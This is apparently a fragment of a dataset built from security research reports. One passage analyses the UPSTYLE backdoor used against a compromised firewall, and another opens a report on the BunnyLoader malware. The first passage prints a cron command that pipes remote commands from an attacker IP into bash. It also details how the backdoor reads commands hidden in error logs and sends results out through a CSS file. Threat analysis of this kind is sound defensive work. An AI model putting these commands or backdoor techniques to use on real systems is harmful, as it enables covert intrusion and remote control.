saw evidence of the creation of a cron job. This cron job would run every minute to access commands hosted on the same external server that would execute via bash, as seen in the following command:\n*   wget -qO- hxxp://172.233.228.93/policy  bash\nWe were unable to access the commands executed via this URL, but we believe this cron job-based backdoor was used to carry out the actor\u2019s post-exploitation activities.\nWhile the threat actors were unable to install the UPSTYLE backdoor, it appears that they created it specifically for this campaign and planned on using it as the initial backdoor. Also, the reason the actors failed to install UPSTYLE included mistakes in the exploit attempts themselves, as well as trivial mistakes in the executed commands. While we have not seen UPSTYLE used in any other exploit attempts, it is possible that UPSTYLE could have been successfully installed on other devices.\nAs previously mentioned, the threat actors attempted three unsuccessful exploit attempts to run commands to install UPSTYLE. For two of these attempts, UPSTYLE was hosted at hxxp://144.172.79.92/update.py.\nIn the third exploit attempt, we saw the actor hosting the backdoor at nhdata.s3-us-west-2.amazonaws.com, which may suggest that the actors thought network-based protections caused the first two failed installation attempts. According to the following HTTP headers, it appears that the threat actor last modified UPSTYLE hosted at 144.172.79.92 on April 7, 2024:\n<table><tbody><tr><td data-settings=\"show\"></td><td><div><p><span>Accept</span>-<span>Ranges</span><span>:</span><span> </span><span>bytes</span></p><p><span>Content</span>-<span>Length</span><span>:</span><span> </span><span>5187</span></p><p><span>Content</span>-<span>Type</span><span>:</span><span> </span><span>application</span>/<span>octet</span>-<span>stream</span></p><p><span>Date</span><span>:</span><span> </span><span>Thu</span><span>,</span><span> </span><span>11</span><span> </span><span>Apr</span><span> </span><span>2024</span><span> </span><span>16</span><span>:</span><span>12</span><span>:</span><span>16</span><span> </span><span>GMT</span></p><p><span>Etag</span><span>:</span><span> </span><span>\"6612443d-1443\"</span></p><p><span>Last</span>-<span>Modified</span><span>:</span><span> </span><span>Sun</span><span>,</span><span> </span><span>07</span><span> </span><span>Apr</span><span> </span><span>2024</span><span> </span><span>06</span><span>:</span><span>59</span><span>:</span><span>09</span><span> </span><span>GMT</span></p><p><span>Server</span><span>:</span><span> </span><span>nginx</span>/<span>1.18.0</span><span> </span><span>(</span><span>Ubuntu</span><span>)</span></p></div></td></tr></tbody></table>\nThe update.py file hosted at 144.172.79.92 has a SHA256 value of 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac. This file is a backdoor that has multiple layers.\nFirst, update.py writes another Python script to the following location:\n*   \\[snip\\]/site-packages/system.pth\nThe Python script written to system.pth Base64-decodes an embedded Python script and executes it. This embedded Python script has two functions named protect and check, which are called in that order.\nThe protect function sends a SIGTERM signal and writes the contents of the system.pth file back to itself, likely as a persistence mechanism. The check function will read /proc/self/cmdline to see if it is running as monitor mp before running another Base64 embedded Python script, which is the functional backdoor.\nThe Python script run by system.pth has a function named \\_\\_main that will run in a thread. This function first reads the contents of the following file, along with its access and modified times:\n*   \\[snip\\]/css/bootstrap.min.css\nIt then enters an infinite loop that iterates once every two seconds, reading in the following file:\n*   \\[snip\\]/sslvpn\\_ngx\\_error.log\nThe script will then iterate through each line of the file and search the line for the threat actor's command using the following regular expression:\n*   img\\\\\\[(\\[a-zA-Z0-9+/=\\]+)\\\\\\]\nIf the above regular expression matches, the script will Base64-encode the contents of the command and run it using the popen method within Python's OS module. The lines of the sslvpn\\_ngx\\_error.log file that do not match the regular expression are written back to the file, which essentially prunes the lines that contain commands from persisting in the sslvpn\\_ngx\\_error.log file for later analysis.\nAfter running the command, the script writes the output of the command to the following file:\n*   \\[snip\\]/css/bootstrap.min.css\nThe script will then create another thread that runs a function called restore. The restore function takes the original content of the bootstrap.min.css file, as well as the original access and modified times, sleeps for 15 seconds and writes the original contents back to the file. It then sets the access and modified times back to their original values.\nThe point of this function is to avoid leaving the output of the commands available for analysis. Also, this suggests that the threat actor has automation built into the client side of this backdoor, as they only have 15 seconds to grab the results before the backdoor overwrites the file.\nThe use of legitimate log files to receive commands and a legitimate CSS file to exfiltrate the command results suggests that the threat actors developed this backdoor specifically to run on a compromised firewall.\n",

        "INPUT": "### Text Passage:\nTitle: Inside the Rabbit Hole: BunnyLoader 3.0 Unveiled\nExecutive Summary\n-----------------\nThis article will focus on the newly released BunnyLoader 3.0, as well as historically observed BunnyLoader infrastructure and an overview of its capabilities. BunnyLoader is dynamically developing malware with the capability to steal information, credentials and cryptocurrency, as well as deliver additional malware to its victims.\nIn an increasingly cutthroat market, cybercriminals must regularly update and retool their malware to compete with other cybercriminals, security tools and researchers alike. Since its initial discovery in September of 2023, BunnyLoader malware as a service (MaaS) has frequently updated its functionality to include the following:\n*   Bug fixes\n*   Additional antivirus evasion and protections\n*   Multiple data recovery functionalities for the stealer portion\n    *   Additional browser paths\n    *   Keylogger functionality\nAdditional activity discovered in October 2023 by Unit 42 threat researchers revealed the threat actor continued to modify and retool BunnyLoader. The threat actor frequently changed their tactics in an effort to deliver and execute the malware in what appears to be an attempt to further obfuscate and evade detection.\nSamples collected during this time included packed binaries using PureCrypter, UPX and Themida during various campaigns in November. In December, the BunnyLoader payload was delivered as a follow-up payload to a PureCrypter infection using a novel .NET injector. Threat actors changed filenames of the malware to mimic legitimate video games and other applications.\nFrequent changes in tactics, techniques and procedures (TTPs) like infrastructure, packers, encryption and method of exfiltration help the attacker evade detection. It\u2019s also meant to undermine cybersecurity researchers\u2019 ability to detect and analyze the threat actor\u2019s activities.\nOn Feb. 11, 2024, the threat actor behind BunnyLoader announced the release of BunnyLoader 3.0, boasting the malware has been \u201ccompletely redesigned and enhanced by 90%.\u201d\nThe threat actor claims enhancements to BunnyLoader payloads include:\n*   Payloads/modules \u201ccompletely rewritten for improved performance\u201d\n*   Reduced payload size\n*   Advanced keylogging capabilities\nBy revealing the threat actor\u2019s continued development of the malware and its evolving TTPs, we aim to empower readers to detect and hopefully prevent this threat.\n",
